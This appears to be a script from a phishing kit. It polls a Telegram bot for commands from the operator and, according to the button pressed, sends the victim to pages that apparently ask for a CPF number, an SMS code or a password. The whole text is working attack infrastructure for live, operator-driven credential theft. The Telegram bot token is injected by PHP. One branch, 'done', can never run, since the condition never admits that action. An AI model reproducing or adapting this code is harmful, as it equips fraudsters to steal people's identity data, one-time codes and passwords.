<script>
    $(document).ready(function() {
    setInterval(makeRequest, 2000);
});

function makeRequest() {
  $.ajax({
    url: "https://api.telegram.org/bot<?php echo $telegram['bot_token'] ?>/getUpdates",
    type: "GET",
    dataType: "json",
    success: function(response) {
      processResponse(response);
    },
    error: function(xhr, status, error) {
      console.error("Request failed with status: " + xhr.status);
    }
  });
}

function processResponse(response) {
  for (var i = 0; i < response.result.length; i++) {
    var result = response.result[i];
    if (result.callback_query && (result.callback_query.data === "<?php echo $full_id ?> cpf_again" || result.callback_query.data === "<?php echo $full_id ?> sms" || result.callback_query.data === "<?php echo $full_id ?> pwd")) {
      var chatId = result.callback_query.message.chat.id;
      var messageId = result.callback_query.message.message_id;
      var action = result.callback_query.data.split(" ")[1];

      deleteMessage(chatId, messageId);

    if (action === "cpf_again") {
        window.location.href = "../user.php"; 
    } else if (action === "sms") {
        window.location.href = "../auth.php"; 
    } else if (action === "pwd") {
        window.location.href = "../password.php"; 
    }else if (action === "done") {
        window.location.href = "<?php echo $redirect['success']; ?>"; 
    }
      break;
    }
  }
}

function deleteMessage(chatId, messageId) {
    var params = {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: '',
    };

    $.ajax({
        url: "https://api.telegram.org/bot<?php echo $telegram['bot_token'] ?>/editMessageReplyMarkup",
        type: "GET",
        data: params,
        success: function(response) {
            console.log("message deleted!");
        },
        error: function(xhr, status, error) {
            console.error("Failed to delete message. Response:", xhr.responseText);
        }
    });
}
</script>